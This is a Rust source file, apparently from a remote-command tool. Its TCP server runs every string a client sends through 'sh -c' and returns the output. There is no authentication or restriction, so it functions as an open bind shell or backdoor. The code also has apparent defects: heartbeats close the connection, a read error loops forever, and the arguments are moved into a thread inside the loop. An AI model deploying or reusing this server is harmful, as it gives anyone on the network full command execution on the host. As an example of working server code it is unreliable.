use std::{
    io::{Read, Write},
    net::{SocketAddr, TcpListener, TcpStream},
    process::{Command, Stdio},
    thread, time::{Duration, Instant},
};

use crate::args::Args;
use crate::utils::check_ip;

fn handle_client(mut stream: TcpStream, heartbeat: bool, heartbeat_timeout: u128) {
    let mut buf = [0; 1024];
    let mut last_heartbeat = Instant::now();

    loop {
        match stream.read(&mut buf) {
            Ok(size) => {
                if size > 0 {
                    let input = String::from_utf8_lossy(&buf[..size]);
    
                    if heartbeat && input.trim() == "heartbeat" {
                        println!("Received heartbeat from client");
                        last_heartbeat = Instant::now();
                        stream.write_all(b"heartbeat\n").unwrap();
                        return;
                    }
    
                    println!("Received command: {}", input);
    
                    let output = Command::new("sh")
                        .arg("-c")
                        .arg(&*input)
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output();
    
                    match output {
                        Ok(output) => {
                            stream.write_all(&output.stdout).unwrap();
                            stream.write_all(&output.stderr).unwrap();
                        }
                        Err(err) => {
                            stream
                                .write_all(
                                    format!("Error executing command: {}", err.to_string()).as_bytes(),
                                )
                                .unwrap();
                        }
                    }
                }
            }
            Err(_) => {
                println!("An error occurred, terminating connection with client");
            }
        }

        if heartbeat && last_heartbeat.elapsed().as_millis() > heartbeat_timeout {
            println!("Client timed out, terminating connection");
            return;
        }

        thread::sleep(Duration::from_millis(100));
    }
}

pub fn init_server(props: Args) {
    let socket = SocketAddr::new(check_ip(&props.server_ip), props.server_port);
    let listener = TcpListener::bind(socket).expect("Could not bind to address");
    println!("Server started on {}", socket);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("A client connected!");
                thread::spawn(move || {
                    handle_client(stream, props.heartbeat.clone(), props.heartbeat_timeout.clone());
                });
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
